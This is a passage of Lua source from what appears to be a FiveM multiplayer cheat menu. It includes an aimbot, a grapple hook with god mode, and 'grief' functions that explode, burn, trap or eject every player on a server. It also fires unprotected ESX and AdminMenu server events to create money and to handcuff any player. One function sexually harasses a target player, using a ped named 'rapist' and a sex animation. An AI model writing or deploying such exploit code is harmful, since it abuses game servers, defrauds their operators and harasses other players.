				local ped_coords = GetEntityCoords(ped, true)
				if GetDistanceBetweenCoords(coords, ped_coords) >= needed_dist then
					ApplyForceToEntity(ped, 1, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, false, false, true, true, false, true)
				end
				--end
			end
		end
		Citizen.Wait(10)
	end
end
CreateThread(rope_gun_tick)


function PiggyNearby()
	--[[Citizen.CreateThread(function()
		local pl_coords = GetEntityCoords(PlayerPedId(), false)
		local nearest_target = nil
		local closest_dist = 99999.0
		
		
		RequestModelSync("a_m_o_acult_01")
		RequestAnimDict("rcmpaparazzo_2")
		while not HasAnimDictLoaded("rcmpaparazzo_2") do
			Citizen.Wait(0)
		end
		if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
			local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
			while not NetworkHasControlOfEntity(veh) do
				NetworkRequestControlOfEntity(veh)
				Citizen.Wait(0)
			end
			SetEntityAsMissionEntity(veh, true, true)
			DeleteVehicle(veh)
			DeleteEntity(veh)
		end
		count = -0.2
		--for b=1,3 do
			local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
			local rapist = CreatePed(4, GetHashKey("a_m_o_acult_01"), x,y,z, 0.0, true, false)
			SetEntityAsMissionEntity(rapist, true, true)
			AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
			ClearPedTasks(GetPlayerPed(SelectedPlayer))
			TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
			SetPedKeepTask(rapist)
			TaskPlayAnim(rapist, "rcmjosh2", "josh_sitting_loop", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
			SetEntityInvincible(rapist, true)
			count = count - 0.4
		--end           
	end)]]
end

function PiggyBack(SelectedPlayer)
	Citizen.CreateThread(function()
		local pl_coords = GetEntityCoords(PlayerPedId(), false)
		local closest_dist = 99999.0
		
		RequestModelSync("a_m_o_acult_01")
		RequestAnimDict("rcmpaparazzo_2")
		while not HasAnimDictLoaded("rcmpaparazzo_2") do
			Citizen.Wait(0)
		end
		if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
			local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
			while not NetworkHasControlOfEntity(veh) do
				NetworkRequestControlOfEntity(veh)
				Citizen.Wait(0)
			end
			SetEntityAsMissionEntity(veh, true, true)
			DeleteVehicle(veh)
			DeleteEntity(veh)
		end
		count = -0.2
		
			local heading = GetEntityHeading(SelectedPlayer)
			local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
			local rapist = CreatePed(4, GetHashKey("a_m_o_acult_01"), x,y,z, 0.0, true, false)
			
			SetEntityAsMissionEntity(rapist, true, true)
			AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.0, 0.0, 0, 0, 90.0, false, false, false, false, 2, true)
			ClearPedTasks(GetPlayerPed(SelectedPlayer))
			SetPedKeepTask(rapist)
			SetEntityInvincible(rapist, true)
			count = count - 0.4
		while true do
		local heading = GetEntityHeading(SelectedPlayer)
			SetEntityHeading(rapist, heading)
			TaskPlayAnim(rapist, "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0, 0, 0, 0)
		Citizen.Wait(0)
		end		 
	end)
end

grapple_has = false
grapple_pos = { x=0,y=0,z=0 }
grapple_prev_godmode = false
grapple_rope = 0
grapple_dummy = nil
grapple_prev_ragdoll = false
grapple_bone = 0

function grapple_hook_tick()
	while isMenuEnabled do
		if grapple_hook_enabled then
			--[[
			\
			local rayHandle = StartShapeTestRay(source.x, source.y, source.z, target.x, target.y, target.z, 16+8+4+2, player, 0)
			local _,_,_,_, rayresult = GetShapeTestResult(rayHandle)
			
			Vector3 GET_CAM_ROT(Cam cam, int rotationOrder);
			
			// GetCamMatrix
		void GET_CAM_MATRIX(Cam camera, Vector3* rightVector, Vector3* forwardVector, Vector3* upVector, Vector3* position);
			]]
			
			local heading = GetEntityHeading(GetPlayerPed(-1))
			
			local cam_rot = GetGameplayCamRot(0)
			local cam_pos = GetGameplayCamCoord()
			
			local max_dist = 1000;
			
			local fx = -(math.sin(math.rad(cam_rot.z)))
			local fy = (math.cos(math.rad(cam_rot.z)))
			local fz =  math.sin(math.rad(cam_rot.x))
			local dir = vector3(fx,fy,fz)
			--local dir = RotToDirection(cam_rot)
			
			local ray_handle = StartShapeTestRay(
				cam_pos.x, cam_pos.y, cam_pos.z, 
				cam_pos.x + (dir.x*max_dist), cam_pos.y + (dir.y*max_dist), cam_pos.z + (dir.z*max_dist), 
				1 + 2,
				PlayerPedId(), 0
			)
			
			--local plocal_wp = GetEntityCoords(PlayerPedId(), false)
			--DrawLine(plocal_wp.x, plocal_wp.y, plocal_wp.z, cam_pos.x + (dir.x*max_dist), cam_pos.y + (dir.y*max_dist), cam_pos.z + (dir.z*max_dist), 0, 0, 255, 255)
			
			local ret_val, hit, end_coords, surface_normal, entity_hit = GetShapeTestResult(ray_handle)
			
			local plocal_pos = GetEntityCoords(PlayerPedId(), false)
				
			if grapple_has == true then
				God_mode = true
				RagdollToggle = true
				--SetPedToRagdoll(PlayerPedId(), 1000, 1000, 0, 0, 0, 0)
				local dir = vector_mul_f(vector_normalize(vector_sub(grapple_pos, plocal_pos)), 2.5)
				--ApplyForceToEntity(PlayerPedId(), 1, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, false, false, true, true, false, true)
				SetEntityVelocity(PlayerPedId(), dir.x, dir.y, dir.z)
				
				--TaskSkyDive(PlayerPedId())
				
				local dist = 100;
				local hand = GetPedBoneCoords(PlayerPedId(), grapple_bone, 0.0, 0.0, 0.0)
				
				local dummy_pos = GetEntityCoords(grapple_dummy, false)
				
				if Vdist(hand2, dummy_pos) < Vdist(hand, dummy_pos) then
					hand = hand2
				end
				
				AttachEntitiesToRope(grapple_rope, GetPlayerPed(PlayerId()), grapple_dummy, hand.x, hand.y, hand.z, dummy_pos.x, dummy_pos.y, dummy_pos.z, dist, false, false, 0, 0)
				SetPedDesiredHeading(PlayerPedId(), cam_rot.z)
				--SetEntityCoordsNoOffset(PlayerPedId(),, false, false, false)
				--SetEntityCoordsNoOffset(PlayerPedId(), plocal_pos.x+dir.x,plocal_pos.y+dir.y,plocal_pos.z+dir.z, true, true, true)
				DrawMarker(
					28, dummy_pos, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 
					0, 255, 0, 255, 
					false, true, 2, nil, nil, false
				)
			elseif hit == 1 then
				DrawMarker(
					28, end_coords, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 
					255, 255, 0, 255, 
					false, true, 2, nil, nil, false
				)
				--DrawLine(plocal_pos.x, plocal_pos.y, plocal_pos.z, end_coords.x, end_coords.y, end_coords.z, 0, 0, 255, 255)
				--DrawLine(cam_pos.x, cam_pos.y, cam_pos.z, end_coords.x, end_coords.y, end_coords.z, 0, 255, 255, 255)
			end
			
			if IsDisabledControlJustPressed(0, 38) then
				if grapple_has == true then
					SetEntityVelocity(PlayerPedId(), 0, 0, 0)
					--TaskStandStill(PlayerPedId(), 1000)
					ClearPedTasksImmediately(PlayerPedId())
					grapple_has = false
					God_mode = grapple_prev_godmode
					RagdollToggle = grapple_prev_ragdoll
					DeleteEntity(grapple_dummy)
					DeleteRope(grapple_rope)
				else		
					if hit == 1 then
						
						if grapple_rope ~= 0 then
							DeleteRope(grapple_rope)
						end
						
						--SetPedToRagdoll(PlayerPedId(), 1000, 1000, 0, 0, 0, 0)
						
						ClearPedTasksImmediately(PlayerPedId())
						TaskSkyDive(PlayerPedId())
						
						local hand = GetPedBoneCoords(PlayerPedId(), 57005, 0.0, 0.0, 0.0) -- right
						local hand2 = GetPedBoneCoords(PlayerPedId(), 18905, 0.0, 0.0, 0.0) -- left
						
						local dummy_pos = GetEntityCoords(grapple_dummy, false)
						
						if grapple_bone == 57005 then
							hand = hand2
							grapple_bone = 18905
						else
							grapple_bone = 57005
						end
						
						--local hand = GetPedBoneCoords(PlayerPedId(), GetEntityBoneIndexByName(PlayerPedId(), "SKEL_R_Hand"), 0.0, 0.0, 0.0) 
						--
						--local hand = vector_sub(real_hand, plocal_pos)
						local dist = 100;
						
						RopeLoadTextures()
						grapple_rope = AddRope(end_coords.x, end_coords.y, end_coords.z, 0.0, 0.0, 0.0, dist, 1, dist, 1.0, 0, 0, 0, 0, 0, 0, 0)
						--AttachRopeToEntity(grapple_rope, PlayerPedId(), hand.x, hand.y, hand.z, true)
						
						RequestModelSync("a_c_crow")
						grapple_dummy = CreatePed(28, GetHashKey("a_c_crow"), end_coords.x, end_coords.y, end_coords.z, 0, true, false)
						--grapple_dummy = CreatePed(4, GetHashKey("a_m_o_acult_01"), end_coords.x, end_coords.y, end_coords.z, 0, true, false)
						local dummy_pos = GetEntityCoords(grapple_dummy, false)
						
						AttachEntitiesToRope(grapple_rope, GetPlayerPed(PlayerId()), grapple_dummy, hand.x, hand.y, hand.z, dummy_pos.x, dummy_pos.y, dummy_pos.z, dist, false, false, 0, 0)
						--AttachRopeToEntity(grapple_rope, GetPlayerPed(PlayerId()), plocal_pos.x,plocal_pos.y,plocal_pos.z, true)
						
						grapple_prev_ragdoll = RagdollToggle
						grapple_prev_godmode = God_mode
						grapple_has = true
						grapple_pos = end_coords
					end
				end
			end
			
			local function DrawTxt2(text, x, y)
				SetTextFont(4)
				SetTextColour(255,255,255,255)
				SetTextProportional(1)
				SetTextCentre(true)
				SetTextScale(0.0, 0.6)
				SetTextDropshadow(1, 0, 0, 0, 255)
				SetTextEdge(1, 0, 0, 0, 255)
				SetTextDropShadow()
				SetTextOutline()
				SetTextEntry("STRING")
				AddTextComponentString(text)
				DrawText(x, y)
			end
			
			DrawTxt2(".", 0.5, 0.5)
			
			--GetGameplayCamCoord
			--Citizen.Wait(50)
		end
		Citizen.Wait(0)
	end
end
Citizen.CreateThread(grapple_hook_tick)

aimbot_bullet_count = 99999
aimbot_last_weapon = 0

function aimbot_tick(players_only, silent, vis_check)
	local target = nil
	local closest_dist = 9999999.0
	
	local current_weapon = GetSelectedPedWeapon(PlayerPedId())
	
	if aimbot_bullet_count ~= 99999 and IsPedReloading(PlayerPedId()) then
		aimbot_bullet_count = 99999
	end
	
	if aimbot_last_weapon ~= current_weapon then
		aimbot_last_weapon = current_weapon
		aimbot_bullet_count = 99999
	end
	
	local _, clip = GetAmmoInClip(PlayerPedId(), aimbot_last_weapon)
	
	local res_x, res_y = GetActiveScreenResolution()
	local midx = 1.0 / (res_x / 2.0)
	local midy = 1.0 / (res_y / 2.0)
	
	local plocal_wp = GetEntityCoords(PlayerPedId(), false)
	
	--[[
	
	
	
	local cam_pos = GetGameplayCamCoord()
			
			local ray_handle = StartShapeTestRay(
				cam_pos.x, cam_pos.y, cam_pos.z, 
				cam_pos.x + (dir.x*max_dist), cam_pos.y + (dir.y*max_dist), cam_pos.z + (dir.z*max_dist), 
				4,
				PlayerPedId(), 0
			)
			
			--local plocal_wp = GetEntityCoords(PlayerPedId(), false)
			--DrawLine(plocal_wp.x, plocal_wp.y, plocal_wp.z, cam_pos.x + (dir.x*max_dist), cam_pos.y + (dir.y*max_dist), cam_pos.z + (dir.z*max_dist), 0, 0, 255, 255)
			
			local ret_val, hit, end_coords, surface_normal, entity_hit = GetShapeTestResult(ray_handle)
	]]
	
	local plocal_head = GetPedBoneCoords(PlayerPedId(), GetEntityBoneIndexByName(PlayerPedId(), "SKEL_HEAD"), 0.0, 0.0, 0.0)
	
	for ped in EnumeratePeds() do
		if (GetPlayerServerId(ped) ~= 0 or not players_only) and ped ~= PlayerPedId() and not IsPedDeadOrDying(ped) then
			local world_pos = GetEntityCoords(ped, false)
			if Vdist(world_pos.x, world_pos.y, world_pos.z, plocal_wp.x, plocal_wp.y, plocal_wp.z) <= 600 then
				
				local pass_vis = true
				
				if vis_check then
					--local test_head = GetPedBoneCoords(PlayerPedId(), GetEntityBoneIndexByName(PlayerPedId(), "SKEL_HEAD"), 0.0, 0.0, 0.0)
					local ray_handle = StartShapeTestRay(
						plocal_head.x, plocal_head.y, plocal_head.z, 
						world_pos.x, world_pos.y, world_pos.z, 
						31,
						PlayerPedId(), 0
					)
					local ret_val, hit, end_coords, surface_normal, entity_hit = GetShapeTestResult(ray_handle)
					pass_vis = entity_hit ~= 0 and hit == 1
				end
				
				if pass_vis then
					local on_screen, sx, sy = WorldToScreenRel(world_pos)
					if on_screen then
						local dist = math.sqrt((midx-sx)*(midx-sx)+(midy-sy)*(midy-sy))
						if dist < closest_dist then
							closest_dist = dist
							target = ped
						end
					end
				end
			end
		end
	end
	
	if target ~= nil then
		local world_pos = GetEntityCoords(target, false)
		DrawLine(plocal_wp.x, plocal_wp.y, plocal_wp.z, world_pos.x, world_pos.y, world_pos.z, 255, 0, 0, 255)
		if silent then			
			local found, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
			if found and clip < aimbot_bullet_count then
				aimbot_bullet_count = clip
				shoot_player_with(target, aimbot_last_weapon, 50)
			end
		else
			PointCamAtCoord(0, world_pos.x, world_pos.y, world_pos.z)
		end
	end
end
-- self section end

--Deer Section

local Deer = {
	Handle = nil,
	Invincible = false,
	Ragdoll = false,
	Marker = false,
	Speed = {
		Walk = 10.0,
		Run = 15.0,
	},
}

function GetNearbyPeds(X, Y, Z, Radius)
	local NearbyPeds = {}
	for Ped in EnumeratePeds() do
		if DoesEntityExist(Ped) then
			local PedPosition = GetEntityCoords(Ped, false)
			if Vdist(X, Y, Z, PedPosition.x, PedPosition.y, PedPosition.z) <= Radius then
				table.insert(NearbyPeds, Ped)
			end
		end
	end
	return NearbyPeds
end

function GetNearbyPeds_except(X, Y, Z, Radius, exc)
	local NearbyPeds = {}
	for Ped in EnumeratePeds() do
		if Ped ~= nil and DoesEntityExist(Ped) and Ped ~= exc then
			local PedPosition = GetEntityCoords(Ped, false)
			if Vdist(X, Y, Z, PedPosition.x, PedPosition.y, PedPosition.z) <= Radius then
				table.insert(NearbyPeds, Ped)
			end
		end
	end
	return NearbyPeds
end

function Deer.Create()
	local Model = GetHashKey("a_c_cow")
	RequestModel(Model)
	while not HasModelLoaded(Model) do
		Citizen.Wait(50)
	end
	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)

	Deer.Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)

	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
	SetEntityInvincible(Deer.Handle, Deer.Invincible)

	SetModelAsNoLongerNeeded(Model)
end

function Deer.Attach()
	local Ped = PlayerPedId()

	FreezeEntityPosition(Deer.Handle, true)
	FreezeEntityPosition(Ped, true)

	local DeerPosition = GetEntityCoords(Deer.Handle, false)
	SetEntityCoords(Ped, DeerPosition.x, DeerPosition.y, DeerPosition.z)

	AttachEntityToEntity(Ped, Deer.Handle, GetPedBoneIndex(Deer.Handle, 24816), -0.3, 0.0, 0.3, 0.0, 0.0, 90.0, false, false, false, true, 2, true)

	TaskPlayAnim(Ped, "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0, 0, 0, 0)

	FreezeEntityPosition(Deer.Handle, false)
	FreezeEntityPosition(Ped, false)
end

function Deer.Ride()
	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)
	if IsPedSittingInAnyVehicle(Ped) or IsPedGettingIntoAVehicle(Ped) then
		return
	end

	local AttachedEntity = GetEntityAttachedTo(Ped)

	if IsEntityAttached(Ped) and GetEntityModel(AttachedEntity) == GetHashKey("a_c_cow") then
		local SideCoordinates = GetCoordsInfrontOfEntityWithDistance(AttachedEntity, 1.0, 90.0)
		local SideHeading = GetEntityHeading(AttachedEntity)

		SideCoordinates.z = GetGroundZ(SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)

		Deer.Handle = nil
		DetachEntity(Ped, true, false)
		ClearPedTasksImmediately(Ped)

		SetEntityCoords(Ped, SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
		SetEntityHeading(Ped, SideHeading)
	else
		for _, Ped in pairs(GetNearbyPeds(PedPosition.x, PedPosition.y, PedPosition.z, 2.0)) do
			if GetEntityModel(Ped) == GetHashKey("a_c_cow") then
				Deer.Handle = Ped
				Deer.Attach()
				break
			end
		end
	end
end

Citizen.CreateThread(function()
    RequestAnimDict("rcmjosh2")
    while not HasAnimDictLoaded("rcmjosh2") do
        Citizen.Wait(250)
    end
    while isMenuEnabled do
        Citizen.Wait(0)



        local Ped = PlayerPedId()
        local AttachedEntity = GetEntityAttachedTo(Ped)

        if (not IsPedSittingInAnyVehicle(Ped) or not IsPedGettingIntoAVehicle(Ped)) and IsEntityAttached(Ped) and AttachedEntity == Deer.Handle then
            if DoesEntityExist(Deer.Handle) then
                local LeftAxisXNormal, LeftAxisYNormal = GetControlNormal(2, 218), GetControlNormal(2, 219)
                local Speed, Range = Deer.Speed.Walk, 4000.0


                local GoToOffset = GetOffsetFromEntityInWorldCoords(Deer.Handle, LeftAxisXNormal * Range, LeftAxisYNormal * -1.0 * Range, 0.0)

                TaskLookAtCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 2)
                TaskGoStraightToCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, Speed, 20000, 40000.0, 0.5)

                if Deer.Marker then
                    DrawMarker(6, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 0, 0, 0, 0, 1.0, 1.0, 1.0, 255, 255, 255, 255, 0, 0, 2, 0, 0, 0, 0)
                end
            end
        end
    end
end)

--Deer Section Ends	
--Esx
function automaticmoneyesx()
	local result = KeyboardInput("Warning, this value can be multiplied!!!", "", 100)
	if result ~= "" then
	local confirm = KeyboardInput("Are you sure? y/n", "", 0)
		if confirm == "y" then
		SwagUI.SendNotification({text = "~g~Testing All Scripts", type = "success"})
		TriggerServerEvent("esx_carthief:pay", result)
		TriggerServerEvent("esx_jobs:caution", "give_back", result)
		TriggerServerEvent("esx_fueldelivery:pay", result)
		TriggerServerEvent("esx_carthief:pay", result)
		TriggerServerEvent("esx_godirtyjob:pay", result)
		TriggerServerEvent("esx_pizza:pay", result)
		TriggerServerEvent("esx_ranger:pay", result)
		TriggerServerEvent("esx_garbagejob:pay", result)
		TriggerServerEvent("esx_truckerjob:pay", result)
		TriggerServerEvent("AdminMenu:giveBank", result)
		TriggerServerEvent("AdminMenu:giveCash", result)
		TriggerServerEvent("esx_gopostaljob:pay", result)
		TriggerServerEvent("esx_banksecurity:pay", result)
		TriggerServerEvent("esx_slotmachine:sv:2", result)
		elseif confirm == "n" then
		SwagUI.SendNotification({text = "~r~Operation Cancelled", type = "error"})
		else
		SwagUI.SendNotification({text = "~b~Invalid Confirmation~s~.", type = "success"})
		SwagUI.SendNotification({text = "~r~Operations Cancelled", type = "error"})
		end
	end
end


-- Grief Section

local function AttachPropAll(prop)
	local pbase = GetActivePlayers()
	for i=0, #pbase do
		if IsPedInAnyVehicle(GetPlayerPed(i), true) then
			local hamburg = prop
			local hamburghash = GetHashKey(hamburg)			
			while not HasModelLoaded(hamburghash) do
				Citizen.Wait(0)
				RequestModel(hamburghash)
			end
			local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
			AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
		else
			local hamburg = prop
			local hamburghash = GetHashKey(hamburg)
		while not HasModelLoaded(hamburghash) do
			Citizen.Wait(0)
			RequestModel(hamburghash)
		end
			local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
			AttachEntityToEntity(hamburger, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
		end
	end
end

local function DogHouseAll(prop)
	local pbase = GetActivePlayers()
	for i=0, #pbase do
		local DH, mB_aymfrCFCt, cbmIa0ckQo = table.unpack(GetEntityCoords(GetPlayerPed(i)))
		ClearPedTasksImmediately(GetPlayerPed(i))
		local Doghouse =
			CreateObject(GetHashKey(prop), DH, mB_aymfrCFCt, cbmIa0ckQo, true, true, false)
		SetEntityHeading(Doghouse, 0)
		FreezeEntityPosition(Doghouse, true)
	end
end

local function BurgerAll()
	local pbase = GetActivePlayers()
	for i=0, #pbase do
		if IsPedInAnyVehicle(GetPlayerPed(i), true) then
			local hamburg = "xs_prop_hamburgher_wl"
			local hamburghash = GetHashKey(hamburg)			
			while not HasModelLoaded(hamburghash) do
				Citizen.Wait(0)
				RequestModel(hamburghash)
			end
			local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
			AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
		else
			local hamburg = "xs_prop_hamburgher_wl"
			local hamburghash = GetHashKey(hamburg)
		while not HasModelLoaded(hamburghash) do
			Citizen.Wait(0)
			RequestModel(hamburghash)
		end
			local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
			AttachEntityToEntity(hamburger, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
		end
	end
end

local function ExplodeAll()
	local pbase = GetActivePlayers()
	for i=0, #pbase do
		local ped = GetPlayerPed(i)
		local coords = GetEntityCoords(ped)
		AddExplosion(coords.x+1, coords.y+1, coords.z+1, 4, 10000.0, true, false, 0.0)
	end
end

local function HydrantAll()
	local pbase = GetActivePlayers()
	for i=0, #pbase do
		local ped = GetPlayerPed(i)
		local coords = GetEntityCoords(ped)
		AddExplosion(coords.x, coords.y, coords.z-1, 13, 10.0, true, false, 0.0)
	end
end

local function FirePipeAll()
	local pbase = GetActivePlayers()
	for i=0, #pbase do
		local ped = GetPlayerPed(i)
		local coords = GetEntityCoords(ped)
		AddExplosion(coords.x, coords.y, coords.z-1, 14, 10.0, true, false, 0.0)
	end
end

function BeachFire(target)
    local beach_fire = GetHashKey("prop_beach_fire")
    RequestModel(beach_fire)
    Citizen.CreateThread(function()
        while not HasModelLoaded(beach_fire) do
            Citizen.Wait(100)
        end
        local object = CreateObject(beach_fire, 0, 0, 0, true, true, false)
        AttachEntityToEntity(object, target, GetPedBoneIndex(target, SKEL_Spine_Root), 0.0, 0.0, 0.0, 0.0, 90.0, 0, false, false, false, false, 2, true)
        SetModelAsNoLongerNeeded(beach_fire)
    end)
end

function FireAll()
    local plist = GetActivePlayers()
    for i = 0, #plist do
        BeachFire(GetPlayerPed(plist[i]))
    end
end

function cuff_player_by_id(id)
	local type = SliderOptions.CuffType.Values[SliderOptions.CuffType.Selected]
	if type == 0 then
		TriggerServerEvent("OG_cuffs:cuffCheckNearest", id)
	elseif type == 1 then
		TriggerServerEvent("CheckHandcuff", id)
	elseif type == 2 then
		TriggerServerEvent("cuffServer", id)
	elseif type == 3 then
		TriggerServerEvent("cuffGranted", id)
	elseif type == 4 then
		TriggerServerEvent("police:cuffGranted", id)
	elseif type == 5 then
		TriggerServerEvent("esx_handcuffs:cuffing", id)
	elseif type == 6 then
		TriggerServerEvent("esx_policejob:handcuff", id)
	end
end

function CuffAll()
	Citizen.CreateThread(function()
		for i = 0, 128 do
			cuff_player_by_id(GetPlayerServerId(i))
		end
	end)
end

function RampAll()
	for vehicle in EnumerateVehicles() do
		local ramp = CreateObject(-145066854, 0, 0, 0, true, true, true)
		NetworkRequestControlOfEntity(vehicle)
		AttachEntityToEntity(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
		NetworkRequestControlOfEntity(ramp)
		SetEntityAsMissionEntity(ramp, true, true)
	end
end

function KickAll()
	local pbase = GetActivePlayers()
	for i = 1, #pbase do
		if IsPedInAnyVehicle(GetPlayerPed(pbase[i]), true) then
			ClearPedTasksImmediately(GetPlayerPed(pbase[i]))
		end
	end
end


--Grief Section end
function vehicleAngle(veh)
    if not veh then return false end
    local vx,vy,vz = table.unpack(GetEntityVelocity(veh))
    local modV = math.sqrt(vx*vx + vy*vy)
    
    
    local rx,ry,rz = table.unpack(GetEntityRotation(veh,0))
    local sn,cs = -math.sin(math.rad(rz)), math.cos(math.rad(rz))
    
    if GetEntitySpeed(veh)* 3.6 < 5 or GetVehicleCurrentGear(veh) == 0 then return 0,modV end --[[speed over 30 km/h]]
    
    local cosX = (sn*vx + cs*vy)/modV
    if cosX > 0.966 or cosX < 0 then return 0,modV end
    return math.deg(math.acos(cosX))*0.5, modV
end
function driftSmoke(base, sub, car, dens, size)
    all_part = {}
    
    for i = 0,dens do
        UseParticleFxAssetNextCall(base)
        W1 = StartParticleFxLoopedOnEntityBone(sub, car, 0.05, 0, 0, 0, 0, 0, GetEntityBoneIndexByName(car, "wheel_lr"), size, 0, 0, 0)

        UseParticleFxAssetNextCall(base)
        W2 = StartParticleFxLoopedOnEntityBone(sub, car, 0.05, 0, 0, 0, 0, 0, GetEntityBoneIndexByName(car, "wheel_rr"), size, 0, 0, 0)

        table.insert(all_part, 1, W1)
        table.insert(all_part, 2, W2)
    end
    
    Citizen.Wait(1000)
    
    for _,W1 in pairs(all_part) do
        StopParticleFxLooped(W1, true)
    end
end

local function SelfRagdollThread()
	while Swag.Toggle.SelfRagdoll do
		SetPedToRagdoll(PlayerPedId(), 1000, 1000, 0, 0, 0, 0)
		Wait(5)
	end
end

local function SelfRagdoll()
	Swag.Toggle.SelfRagdoll = not Swag.Toggle.SelfRagdoll

	if Swag.Toggle.SelfRagdoll then
		CreateThread(SelfRagdollThread)
	end
end

function getEntityInCrosshair(player)
    local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
    return entity
end

-- Config for LSC
local LSC = {}

LSC.vehicleMods = {
	{name = "Spoilers", id = 0, meta = "modSpoilers"},
	{name = "Front Bumper", id = 1, meta = "modFrontBumper"},
	{name = "Rear Bumper", id = 2, meta = "modRearBumper"},
	{name = "Side Skirt", id = 3, meta = "modSideSkirt"},
	{name = "Exhaust", id = 4, meta = "modExhaust"},
	{name = "Frame", id = 5, meta = "modFrame"},
	{name = "Grille", id = 6, meta = "modGrille"},
	{name = "Hood", id = 7, meta = "modHood"},
	{name = "Fender", id = 8, meta = "modFender"},
	{name = "Right Fender", id = 9, meta = "modRightFender"},
	{name = "Roof", id = 10, meta = "modRoof"},
	{name = "Xenon Lights", id = 22, meta = "modXenon"},
	{name = "Vanity Plates", id = 26, meta = "modVanityPlate"},
	{name = "Trim", id = 27, meta = "modTrim"},
	{name = "Ornaments", id = 28, meta = "modOrnaments"},
	{name = "Dashboard", id = 29, meta = "modDashboard"},
	{name = "Dial", id = 30, meta = "modDial"},
	{name = "Door Speaker", id = 31, meta = "modDoorSpeaker"},
	{name = "Seats", id = 32, meta = "modSeats"},
	{name = "Steering Wheel", id = 33, meta = "modSteeringWheel"},
	{name = "Shifter Leavers", id = 34, meta = "modShifterLeavers"},
	{name = "Plaques", id = 35, meta = "modPlaques"},
	{name = "Speakers", id = 36, meta = "modSpeakers"},
	{name = "Trunk", id = 37, meta = "modTrunk"},
	{name = "Hydraulics", id = 38, meta = "modHydraulics"},
	{name = "Engine Block", id = 39, meta = "modEngineBlock"},
	{name = "Air Filter", id = 40, meta = "modAirFilter"},
	{name = "Struts", id = 41, meta = "modStruts"},
	{name = "Arch Cover", id = 42, meta = "modArchCover"},
	{name = "Aerials", id = 43, meta = "modAerials"},
	{name = "Trim 2", id = 44, meta = "modTrimB"},
	{name = "Tank", id = 45, meta = "modTank"},
	{name = "Windows", id = 46, meta = "modWindows"},
	{name = "Livery", id = 48, meta = "modLivery"},
	{name = "Horns", id = 14, meta = "modHorns"},
	{name = "Wheels", id = 23, meta = "modFrontWheels"},
	{name = "Back Wheels", id = 24, meta = "modBackWheels"},
	-- {name = "Wheel Types", id = "wheeltypes"},
	-- {name = "Extras", id = "extra"},
	-- {name = "Neons", id = "neon"},
	-- {name = "Paint", id = "paint"},
}

LSC.perfMods = {
	{name = "Armor", id = 16, meta = "modArmor"},
	{name = "Engine", id = 11, meta = "modEngine"},
	{name = "Brakes", id = 12, meta = "modBrakes"},
	{name = "Transmission", id = 13, meta = "modTransmission"},
	{name = "Suspension", id = 15, meta = "modSuspension"},
}

LSC.horns = {
	["HORN_STOCK"] = -1,
	["Truck Horn"] = 1,
	["Police Horn"] = 2,
	["Clown Horn"] = 3,
	["Musical Horn 1"] = 4,
	["Musical Horn 2"] = 5,
	["Musical Horn 3"] = 6,
	["Musical Horn 4"] = 7,
	["Musical Horn 5"] = 8,
	["Sad Trombone Horn"] = 9,
	["Classical Horn 1"] = 10,
	["Classical Horn 2"] = 11,
	["Classical Horn 3"] = 12,
	["Classical Horn 4"] = 13,
	["Classical Horn 5"] = 14,
	["Classical Horn 6"] = 15,
	["Classical Horn 7"] = 16,
	["Scaledo Horn"] = 17,
	["Scalere Horn"] = 18,
	["Salemi Horn"] = 19,
	["Scalefa Horn"] = 20,
	["Scalesol Horn"] = 21,
	["Scalela Horn"] = 22,
	["Scaleti Horn"] = 23,
	["Scaledo Horn High"] = 24,
	["Jazz Horn 1"] = 25,
	["Jazz Horn 2"] = 26,
